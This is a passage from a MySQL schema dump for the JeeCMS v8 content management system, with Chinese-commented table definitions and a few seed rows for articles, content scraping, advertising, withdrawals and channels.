CREATE DATABASE  IF NOT EXISTS `jeecmsv8` /*!40100 DEFAULT CHARACTER SET utf8 */;
USE `jeecmsv8`;
-- MySQL dump 10.13  Distrib 5.7.12, for Win64 (x86_64)
--
-- Host: localhost    Database: jeecmsv8
-- ------------------------------------------------------
-- Server version	5.7.17-log

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `ita_common_operatehistory`
--

DROP TABLE IF EXISTS `ita_common_operatehistory`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ita_common_operatehistory` (
  `id` char(36) NOT NULL COMMENT '主键id',
  `parentId` char(36) NOT NULL COMMENT '关联id',
  `update_Type` tinyint(1) NOT NULL DEFAULT '1' COMMENT '修改类型。1:更新操作（扩展用）',
  `update_Content` varchar(50) DEFAULT NULL COMMENT '修改内容。（扩展用，字段长度以后按照实际需求修改）',
  `updaterId` char(36) NOT NULL COMMENT '修改人id',
  `update_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='通用操作历史表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ita_common_operatehistory`
--

LOCK TABLES `ita_common_operatehistory` WRITE;
/*!40000 ALTER TABLE `ita_common_operatehistory` DISABLE KEYS */;
/*!40000 ALTER TABLE `ita_common_operatehistory` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ita_contents`
--

DROP TABLE IF EXISTS `ita_contents`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ita_contents` (
  `id` char(36) NOT NULL COMMENT '主键id',
  `categoryId` char(36) NOT NULL COMMENT '栏目id，关联',
  `title` varchar(50) NOT NULL COMMENT '标题',
  `title_img` varchar(100) DEFAULT NULL COMMENT '标题图片',
  `tags` varchar(50) DEFAULT NULL COMMENT 'tag标签 以“，”分割',
  `summary` varchar(50) NOT NULL COMMENT '摘要。当摘要内容为空时，则自动从内容中截取',
  `author` varchar(50) DEFAULT NULL COMMENT '作者',
  `origin` varchar(50) DEFAULT NULL COMMENT '来源。表示从哪引用',
  `origin_Url` varchar(100) DEFAULT NULL COMMENT '来源URL。引用页面URL',
  `top_Level` tinyint(2) DEFAULT NULL COMMENT '置顶级别。预留',
  `top_EndDate` datetime DEFAULT NULL COMMENT '置顶到期时间。预留',
  `archive_Date` datetime DEFAULT NULL COMMENT '归档时间。预留',
  `content_TypeId` char(36) NOT NULL COMMENT '内容类型id，关联',
  `isRecommend` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否推荐。0：否/1：是（预留）',
  `isDraft` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否为草稿。0：否/1：是',
  `content` longtext NOT NULL COMMENT '内容',
  `content_Url` varchar(100) DEFAULT NULL COMMENT '访问URL。保存后生成的URL,只有审核通过的数据能被访问',
  `createrId` char(36) NOT NULL COMMENT '创建人id',
  `createDate` datetime NOT NULL COMMENT '创建时间。对应页面“发布时间”字段',
  `status` tinyint(1) NOT NULL COMMENT '状态。1：保存（当是否为草稿字段为否时提交审批），2：驳回（重新编辑并保存之后状态变为保存状态），3：通过（通过的数据可以供外部用户访问；当用户再次点击保存之后状态变为保存状态），4：删除',
  `remark` varchar(50) DEFAULT NULL COMMENT '备注',
  `approverId` char(36) DEFAULT NULL COMMENT '审批人id',
  `approveDate` datetime DEFAULT NULL COMMENT '审批时间',
  `approveOpinion` varchar(50) DEFAULT NULL COMMENT '审批意见',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='文章内容管理表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ita_contents`
--

LOCK TABLES `ita_contents` WRITE;
/*!40000 ALTER TABLE `ita_contents` DISABLE KEYS */;
/*!40000 ALTER TABLE `ita_contents` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ita_enum`
--

DROP TABLE IF EXISTS `ita_enum`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ita_enum` (
  `id` char(36) NOT NULL COMMENT '主键id',
  `enumClassId` char(36) NOT NULL COMMENT '枚举类型id，关联EnumClass表id字段\n',
  `enumCode` varchar(50) NOT NULL COMMENT '枚举Code值\n',
  `enumName` varchar(50) NOT NULL COMMENT '枚举类型名称',
  `enumWord` varchar(50) NOT NULL COMMENT '枚举名称拼写',
  `shortCode` varchar(50) NOT NULL COMMENT '枚举缩写',
  `status` tinyint(1) NOT NULL COMMENT '状态 1：启用/2：停用/3：删除\n',
  `isDefault` tinyint(1) NOT NULL COMMENT '是否为预定义 0：否/1：是\n\n',
  `remark` varchar(50) DEFAULT NULL COMMENT '备注',
  `sortNo` tinyint(2) NOT NULL COMMENT '排序字段',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='枚举表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ita_enum`
--

LOCK TABLES `ita_enum` WRITE;
/*!40000 ALTER TABLE `ita_enum` DISABLE KEYS */;
/*!40000 ALTER TABLE `ita_enum` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ita_enumclass`
--

DROP TABLE IF EXISTS `ita_enumclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ita_enumclass` (
  `id` char(36) COLLATE utf8_bin NOT NULL COMMENT '主键id',
  `parentId` char(36) COLLATE utf8_bin DEFAULT NULL COMMENT '父节点id，关联EnumClass表id字段',
  `enumClassName` varchar(50) COLLATE utf8_bin NOT NULL COMMENT '枚举类型名称',
  `enumWord` varchar(50) COLLATE utf8_bin NOT NULL COMMENT '枚举类型拼写',
  `remark` varchar(50) COLLATE utf8_bin DEFAULT NULL COMMENT '备注',
  `sortNo` tinyint(2) NOT NULL COMMENT '排序字段',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='枚举类型表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ita_enumclass`
--

LOCK TABLES `ita_enumclass` WRITE;
/*!40000 ALTER TABLE `ita_enumclass` DISABLE KEYS */;
/*!40000 ALTER TABLE `ita_enumclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_account_draw`
--

DROP TABLE IF EXISTS `jc_account_draw`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_account_draw` (
  `account_draw_id` int(11) NOT NULL AUTO_INCREMENT,
  `draw_user_id` int(11) NOT NULL DEFAULT '0' COMMENT '提现申请者',
  `apply_account` varchar(100) DEFAULT '' COMMENT '申请账户（微信号或支付宝账户）',
  `apply_amount` double NOT NULL DEFAULT '0' COMMENT '提现申请金额',
  `apply_status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '处理状态(0申请中 1申请成功待支付 2申请失败 3提现成功)',
  `account_pay_id` int(11) DEFAULT NULL COMMENT '申请成功后支付ID',
  `apply_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '申请时间',
  PRIMARY KEY (`account_draw_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户账户提现申请';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_account_draw`
--

LOCK TABLES `jc_account_draw` WRITE;
/*!40000 ALTER TABLE `jc_account_draw` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_account_draw` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_account_pay`
--

DROP TABLE IF EXISTS `jc_account_pay`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_account_pay` (
  `account_pay_id` bigint(20) NOT NULL AUTO_INCREMENT,
  `draw_num` varchar(50) NOT NULL DEFAULT '' COMMENT '内部流水号',
  `pay_user_id` int(11) NOT NULL DEFAULT '0' COMMENT '支付者',
  `draw_user_id` int(11) NOT NULL DEFAULT '0' COMMENT '提现者',
  `pay_account` varchar(100) NOT NULL DEFAULT '' COMMENT '支出账户',
  `draw_account` varchar(100) NOT NULL DEFAULT '' COMMENT '收入账户(微信账户名)',
  `pay_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '支付时间',
  `weixin_num` varchar(100) DEFAULT NULL COMMENT '微信流水号',
  `alipay_num` varchar(100) DEFAULT NULL COMMENT '支付宝流水号',
  PRIMARY KEY (`account_pay_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户账户提现支付';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_account_pay`
--

LOCK TABLES `jc_account_pay` WRITE;
/*!40000 ALTER TABLE `jc_account_pay` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_account_pay` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_acquisition`
--

DROP TABLE IF EXISTS `jc_acquisition`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_acquisition` (
  `acquisition_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `channel_id` int(11) NOT NULL,
  `type_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `acq_name` varchar(50) NOT NULL COMMENT '采集名称',
  `start_time` datetime DEFAULT NULL COMMENT '开始时间',
  `end_time` datetime DEFAULT NULL COMMENT '停止时间',
  `status` int(11) NOT NULL DEFAULT '0' COMMENT '当前状态(0:静止;1:采集;2:暂停)',
  `curr_num` int(11) NOT NULL DEFAULT '0' COMMENT '当前号码',
  `curr_item` int(11) NOT NULL DEFAULT '0' COMMENT '当前条数',
  `total_item` int(11) NOT NULL DEFAULT '0' COMMENT '每页总条数',
  `pause_time` int(11) NOT NULL DEFAULT '0' COMMENT '暂停时间(毫秒)',
  `page_encoding` varchar(20) NOT NULL DEFAULT 'GBK' COMMENT '页面编码',
  `plan_list` longtext COMMENT '采集列表',
  `dynamic_addr` varchar(255) DEFAULT NULL COMMENT '动态地址',
  `dynamic_start` int(11) DEFAULT NULL COMMENT '页码开始',
  `dynamic_end` int(11) DEFAULT NULL COMMENT '页码结束',
  `linkset_start` varchar(255) DEFAULT NULL COMMENT '内容链接区开始',
  `linkset_end` varchar(255) DEFAULT NULL COMMENT '内容链接区结束',
  `link_start` varchar(255) DEFAULT NULL COMMENT '内容链接开始',
  `link_end` varchar(255) DEFAULT NULL COMMENT '内容链接结束',
  `title_start` varchar(255) DEFAULT NULL COMMENT '标题开始',
  `title_end` varchar(255) DEFAULT NULL COMMENT '标题结束',
  `keywords_start` varchar(255) DEFAULT NULL COMMENT '关键字开始',
  `keywords_end` varchar(255) DEFAULT NULL COMMENT '关键字结束',
  `description_start` varchar(255) DEFAULT NULL COMMENT '描述开始',
  `description_end` varchar(255) DEFAULT NULL COMMENT '描述结束',
  `content_start` varchar(255) DEFAULT NULL COMMENT '内容开始',
  `content_end` varchar(255) DEFAULT NULL COMMENT '内容结束',
  `pagination_start` varchar(255) DEFAULT NULL COMMENT '内容分页开始',
  `pagination_end` varchar(255) DEFAULT NULL COMMENT '内容分页结束',
  `queue` int(11) NOT NULL DEFAULT '0' COMMENT '队列',
  `repeat_check_type` varchar(20) NOT NULL DEFAULT 'NONE' COMMENT '重复类型',
  `img_acqu` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否采集图片',
  `content_prefix` varchar(255) DEFAULT NULL COMMENT '内容地址补全url',
  `img_prefix` varchar(255) DEFAULT NULL COMMENT '图片地址补全url',
  `view_start` varchar(255) DEFAULT NULL COMMENT '浏览量开始',
  `view_end` varchar(255) DEFAULT NULL COMMENT '浏览量结束',
  `view_id_start` varchar(255) DEFAULT NULL COMMENT 'id前缀',
  `view_id_end` varchar(255) DEFAULT NULL COMMENT 'id后缀',
  `view_link` varchar(255) DEFAULT NULL COMMENT '浏览量动态访问地址',
  `releaseTime_start` varchar(255) DEFAULT NULL COMMENT '发布时间开始',
  `releaseTime_end` varchar(255) DEFAULT NULL COMMENT '发布时间结束',
  `author_start` varchar(255) DEFAULT NULL COMMENT '作者开始',
  `author_end` varchar(255) DEFAULT NULL COMMENT '作者结束',
  `origin_start` varchar(255) DEFAULT NULL COMMENT '来源开始',
  `origin_end` varchar(255) DEFAULT NULL COMMENT '来源结束',
  `releaseTime_format` varchar(255) DEFAULT NULL COMMENT '发布时间格式',
  `origin_appoint` varchar(255) DEFAULT NULL COMMENT '指定来源',
  PRIMARY KEY (`acquisition_id`),
  KEY `fk_jc_acquisition_channel` (`channel_id`),
  KEY `fk_jc_acquisition_contenttype` (`type_id`),
  KEY `fk_jc_acquisition_site` (`site_id`),
  KEY `fk_jc_acquisition_user` (`user_id`),
  CONSTRAINT `fk_jc_acquisition_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`),
  CONSTRAINT `fk_jc_acquisition_contenttype` FOREIGN KEY (`type_id`) REFERENCES `jc_content_type` (`type_id`),
  CONSTRAINT `fk_jc_acquisition_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_acquisition_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS采集表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_acquisition`
--

LOCK TABLES `jc_acquisition` WRITE;
/*!40000 ALTER TABLE `jc_acquisition` DISABLE KEYS */;
INSERT INTO `jc_acquisition` VALUES (1,1,75,1,1,'测试采集',NULL,NULL,0,0,0,0,500,'UTF-8','http://roll.news.sina.com.cn/s/channel.php?ch=01#col=91&spec=&type=&ch=01&k=&offset_page=0&offset_num=0&num=60&asc=&page=3','',2,10,'<div class=\"d_list_txt\" id=\"d_list\">','<div class=\"pagebox\">','<span class=\"c_tit\"><a href=\"','\" target=\"_blank\">','<meta property=\"og:title\" content=\"','\" />',NULL,NULL,'','','<div class=\"article article_16\" id=\"artibody\">','<p class=\"article-editor\">',NULL,NULL,0,'NONE',0,'','','','','','','','','','','','','','yyyy-MM-dd HH:mm:ss','');
/*!40000 ALTER TABLE `jc_acquisition` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_acquisition_history`
--

DROP TABLE IF EXISTS `jc_acquisition_history`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_acquisition_history` (
  `history_id` int(11) NOT NULL AUTO_INCREMENT,
  `channel_url` varchar(255) NOT NULL DEFAULT '' COMMENT '栏目地址',
  `content_url` varchar(255) NOT NULL DEFAULT '' COMMENT '内容地址',
  `title` varchar(255) DEFAULT NULL COMMENT '标题',
  `description` varchar(20) NOT NULL DEFAULT '' COMMENT '描述',
  `acquisition_id` int(11) DEFAULT NULL COMMENT '采集源',
  `content_id` int(11) DEFAULT NULL COMMENT '内容',
  PRIMARY KEY (`history_id`),
  KEY `fk_acquisition_history_acquisition` (`acquisition_id`),
  CONSTRAINT `fk_jc_history_acquisition` FOREIGN KEY (`acquisition_id`) REFERENCES `jc_acquisition` (`acquisition_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='采集历史记录表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_acquisition_history`
--

LOCK TABLES `jc_acquisition_history` WRITE;
/*!40000 ALTER TABLE `jc_acquisition_history` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_acquisition_history` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_acquisition_temp`
--

DROP TABLE IF EXISTS `jc_acquisition_temp`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_acquisition_temp` (
  `temp_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) DEFAULT NULL,
  `channel_url` varchar(255) NOT NULL DEFAULT '' COMMENT '栏目地址',
  `content_url` varchar(255) NOT NULL DEFAULT '' COMMENT '内容地址',
  `title` varchar(255) DEFAULT NULL COMMENT '标题',
  `finish_percent` int(3) NOT NULL DEFAULT '0' COMMENT '百分比',
  `description` varchar(20) NOT NULL DEFAULT '' COMMENT '描述',
  `seq` int(3) NOT NULL DEFAULT '0' COMMENT '顺序',
  PRIMARY KEY (`temp_id`),
  KEY `fk_jc_temp_site` (`site_id`),
  CONSTRAINT `fk_jc_temp_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='采集进度临时表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_acquisition_temp`
--

LOCK TABLES `jc_acquisition_temp` WRITE;
/*!40000 ALTER TABLE `jc_acquisition_temp` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_acquisition_temp` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_advertising`
--

DROP TABLE IF EXISTS `jc_advertising`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_advertising` (
  `advertising_id` int(11) NOT NULL AUTO_INCREMENT,
  `adspace_id` int(11) NOT NULL,
  `site_id` int(11) NOT NULL,
  `ad_name` varchar(100) NOT NULL COMMENT '广告名称',
  `category` varchar(50) NOT NULL COMMENT '广告类型',
  `ad_code` longtext COMMENT '广告代码',
  `ad_weight` int(11) NOT NULL DEFAULT '1' COMMENT '广告权重',
  `display_count` bigint(20) NOT NULL DEFAULT '0' COMMENT '展现次数',
  `click_count` bigint(20) NOT NULL DEFAULT '0' COMMENT '点击次数',
  `start_time` date DEFAULT NULL COMMENT '开始时间',
  `end_time` date DEFAULT NULL COMMENT '结束时间',
  `is_enabled` char(1) NOT NULL DEFAULT '1' COMMENT '是否启用',
  PRIMARY KEY (`advertising_id`),
  KEY `fk_jc_advertising_site` (`site_id`),
  KEY `fk_jc_space_advertising` (`adspace_id`),
  CONSTRAINT `fk_jc_advertising_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_space_advertising` FOREIGN KEY (`adspace_id`) REFERENCES `jc_advertising_space` (`adspace_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS广告表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_advertising`
--

LOCK TABLES `jc_advertising` WRITE;
/*!40000 ALTER TABLE `jc_advertising` DISABLE KEYS */;
INSERT INTO `jc_advertising` VALUES (1,1,1,'www.jeecms.com','text',NULL,1,0,0,NULL,NULL,'1');
/*!40000 ALTER TABLE `jc_advertising` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_advertising_attr`
--

DROP TABLE IF EXISTS `jc_advertising_attr`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_advertising_attr` (
  `advertising_id` int(11) NOT NULL,
  `attr_name` varchar(50) NOT NULL COMMENT '名称',
  `attr_value` varchar(255) DEFAULT NULL COMMENT '值',
  KEY `fk_jc_params_advertising` (`advertising_id`),
  CONSTRAINT `fk_jc_params_advertising` FOREIGN KEY (`advertising_id`) REFERENCES `jc_advertising` (`advertising_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS广告属性表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_advertising_attr`
--

LOCK TABLES `jc_advertising_attr` WRITE;
/*!40000 ALTER TABLE `jc_advertising_attr` DISABLE KEYS */;
INSERT INTO `jc_advertising_attr` VALUES (1,'text_title','www.jeecms.com'),(1,'text_target','_blank'),(1,'text_link','http://www.jeecms.com');
/*!40000 ALTER TABLE `jc_advertising_attr` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_advertising_space`
--

DROP TABLE IF EXISTS `jc_advertising_space`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_advertising_space` (
  `adspace_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `ad_name` varchar(100) NOT NULL COMMENT '名称',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `is_enabled` char(1) NOT NULL COMMENT '是否启用',
  PRIMARY KEY (`adspace_id`),
  KEY `fk_jc_adspace_site` (`site_id`),
  CONSTRAINT `fk_jc_adspace_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS广告版位表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_advertising_space`
--

LOCK TABLES `jc_advertising_space` WRITE;
/*!40000 ALTER TABLE `jc_advertising_space` DISABLE KEYS */;
INSERT INTO `jc_advertising_space` VALUES (1,1,'1','111','1');
/*!40000 ALTER TABLE `jc_advertising_space` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_channel`
--

DROP TABLE IF EXISTS `jc_channel`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_channel` (
  `channel_id` int(11) NOT NULL AUTO_INCREMENT,
  `model_id` int(11) NOT NULL COMMENT '模型ID',
  `site_id` int(11) NOT NULL COMMENT '站点ID',
  `parent_id` int(11) DEFAULT NULL COMMENT '父栏目ID',
  `channel_path` varchar(30) DEFAULT NULL COMMENT '访问路径',
  `lft` int(11) NOT NULL DEFAULT '1' COMMENT '树左边',
  `rgt` int(11) NOT NULL DEFAULT '2' COMMENT '树右边',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `has_content` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否有内容',
  `is_display` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否显示',
  PRIMARY KEY (`channel_id`),
  KEY `fk_jc_channel_model` (`model_id`),
  KEY `fk_jc_channel_parent` (`parent_id`),
  KEY `fk_jc_channel_site` (`site_id`),
  CONSTRAINT `fk_jc_channel_model` FOREIGN KEY (`model_id`) REFERENCES `jc_model` (`model_id`),
  CONSTRAINT `fk_jc_channel_parent` FOREIGN KEY (`parent_id`) REFERENCES `jc_channel` (`channel_id`),
  CONSTRAINT `fk_jc_channel_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=94 DEFAULT CHARSET=utf8 COMMENT='CMS栏目表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_channel`
--

LOCK TABLES `jc_channel` WRITE;
/*!40000 ALTER TABLE `jc_channel` DISABLE KEYS */;
INSERT INTO `jc_channel` VALUES (75,1,1,NULL,'news',1,2,10,1,1),(76,5,1,NULL,'pic',3,4,10,1,1),(77,6,1,NULL,'video',5,6,10,1,1),(78,4,1,NULL,'download',7,16,10,1,1),(79,8,1,NULL,'job',17,18,10,1,1),(80,2,1,NULL,'survey',19,20,11,0,1),(82,2,1,NULL,'message',21,22,10,0,1),(90,4,1,78,'xtrj',8,9,10,1,1),(91,4,1,78,'mtzs',10,11,10,1,1),(92,4,1,78,'jptj',12,13,9,1,1),(93,4,1,78,'yxyl',14,15,10,1,1);
/*!40000 ALTER TABLE `jc_channel` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_channel_attr`
--

DROP TABLE IF EXISTS `jc_channel_attr`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_channel_attr` (
  `channel_id` int(11) NOT NULL,
  `attr_name` varchar(30) NOT NULL COMMENT '名称',
  `attr_value` varchar(255) DEFAULT NULL COMMENT '值',
  KEY `fk_jc_attr_channel` (`channel_id`),
  CONSTRAINT `fk_jc_attr_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目扩展属性表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_channel_attr`
--

LOCK TABLES `jc_channel_attr` WRITE;
/*!40000 ALTER TABLE `jc_channel_attr` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_channel_attr` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_channel_count`
--

DROP TABLE IF EXISTS `jc_channel_count`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_channel_count` (
  `channel_id` int(11) NOT NULL,
  `views` int(11) NOT NULL DEFAULT '0' COMMENT '总访问数',
  `views_month` int(11) NOT NULL DEFAULT '0' COMMENT '月访问数',
  `views_week` int(11) NOT NULL DEFAULT '0' COMMENT '周访问数',
  `views_day` int(11) NOT NULL DEFAULT '0' COMMENT '日访问数',
  `content_count_total` int(11) NOT NULL DEFAULT '0' COMMENT '内容发布数',
  `content_count_day` int(11) NOT NULL DEFAULT '0' COMMENT '内容今日发布数',
  `content_count_week` int(11) NOT NULL DEFAULT '0' COMMENT '内容本周发布数',
  `content_count_month` int(11) NOT NULL DEFAULT '0' COMMENT '内容本月发布数',
  `content_count_year` int(11) NOT NULL DEFAULT '0' COMMENT '内容今年发布数',
  PRIMARY KEY (`channel_id`),
  CONSTRAINT `fk_jc_count_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目访问量计数表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_channel_count`
--

LOCK TABLES `jc_channel_count` WRITE;
/*!40000 ALTER TABLE `jc_channel_count` DISABLE KEYS */;
INSERT INTO `jc_channel_count` VALUES (75,443,0,0,0,24,18,18,18,24),(76,203,0,0,0,11,0,0,0,11),(77,38,0,0,0,15,0,0,0,15),(78,25,0,0,0,14,0,0,0,14),(79,49,0,0,0,10,0,0,0,10),(80,33,0,0,0,0,0,0,0,0),(82,6,0,0,0,0,0,0,0,0),(90,12,0,0,0,4,0,0,0,4),(91,2,0,0,0,8,0,0,0,8),(92,12,0,0,0,0,0,0,0,0),(93,2,0,0,0,2,0,0,0,2);
/*!40000 ALTER TABLE `jc_channel_count` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_channel_ext`
--

DROP TABLE IF EXISTS `jc_channel_ext`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_channel_ext` (
  `channel_id` int(11) NOT NULL,
  `channel_name` varchar(100) NOT NULL COMMENT '名称',
  `final_step` tinyint(4) DEFAULT '2' COMMENT '终审级别',
  `after_check` tinyint(4) DEFAULT NULL COMMENT '审核后(1:不能修改删除;2:修改后退回;3:修改后不变)',
  `is_static_channel` char(1) NOT NULL DEFAULT '0' COMMENT '是否栏目静态化',
  `is_static_content` char(1) NOT NULL DEFAULT '0' COMMENT '是否内容静态化',
  `is_access_by_dir` char(1) NOT NULL DEFAULT '1' COMMENT '是否使用目录访问',
  `is_list_child` char(1) NOT NULL DEFAULT '0' COMMENT '是否使用子栏目列表',
  `page_size` int(11) NOT NULL DEFAULT '20' COMMENT '每页多少条记录',
  `channel_rule` varchar(150) DEFAULT NULL COMMENT '栏目页生成规则',
  `content_rule` varchar(150) DEFAULT NULL COMMENT '内容页生成规则',
  `link` varchar(255) DEFAULT NULL COMMENT '外部链接',
  `tpl_channel` varchar(100) DEFAULT NULL COMMENT '栏目页模板',
  `tpl_content` varchar(100) DEFAULT NULL COMMENT '内容页模板',
  `title_img` varchar(100) DEFAULT NULL COMMENT '缩略图',
  `content_img` varchar(100) DEFAULT NULL COMMENT '内容图',
  `has_title_img` tinyint(1) NOT NULL DEFAULT '0' COMMENT '内容是否有缩略图',
  `has_content_img` tinyint(1) NOT NULL DEFAULT '0' COMMENT '内容是否有内容图',
  `title_img_width` int(11) NOT NULL DEFAULT '139' COMMENT '内容标题图宽度',
  `title_img_height` int(11) NOT NULL DEFAULT '139' COMMENT '内容标题图高度',
